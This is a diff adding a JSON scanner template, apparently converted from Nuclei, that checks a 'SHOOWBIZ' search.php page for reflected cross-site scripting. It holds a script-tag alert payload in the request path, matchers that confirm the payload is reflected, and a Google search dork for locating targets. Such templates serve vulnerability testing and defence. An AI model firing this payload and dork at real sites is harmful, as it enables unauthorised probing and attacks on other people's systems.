@@ -1,0 +1,121 @@
+{
+  "id": "shoowbiz-xss",
+  "name": "SHOOWBIZ - Cross Site Scripting",
+  "author": "r3Y3r53",
+  "severity": "MEDIUM",
+  "description": "Cross-Site Scripting, is a type of security vulnerability commonly found in web applications. It occurs when an attacker injects malicious scripts (typically written in JavaScript) into web pages viewed by other users.\n",
+  "references": [
+    "https://www.exploitalert.com/view-details.html?id\u003d36000"
+  ],
+  "tags": [
+    "shoowbiz",
+    "xss"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "google": "inurl:\"search.php?q\u003d\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/search.php?q\u003d%3CScRipT%3Ealert(document.domain);%3C/ScRipT%3E",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200",
+            "contains(content_type, \"text/html\")",
+            "contains(body, \"\u003cScRipT\u003ealert(document.domain);\u003c/ScRipT\u003e\")",
+            "contains(body, \"Search result in\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "shoowbiz-xss",
+    "info": {
+      "name": "SHOOWBIZ - Cross Site Scripting",
+      "author": "r3Y3r53",
+      "severity": "medium",
+      "description": "Cross-Site Scripting, is a type of security vulnerability commonly found in web applications. It occurs when an attacker injects malicious scripts (typically written in JavaScript) into web pages viewed by other users.\n",
+      "reference": [
+        "https://www.exploitalert.com/view-details.html?id\u003d36000"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "google_query": "inurl:\"search.php?q\u003d\""
+      },
+      "tags": "shoowbiz,xss"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/search.php?q\u003d%3CScRipT%3Ealert(document.domain);%3C/ScRipT%3E"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200",
+              "contains(content_type, \"text/html\")",
+              "contains(body, \"\u003cScRipT\u003ealert(document.domain);\u003c/ScRipT\u003e\")",
+              "contains(body, \"Search result in\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
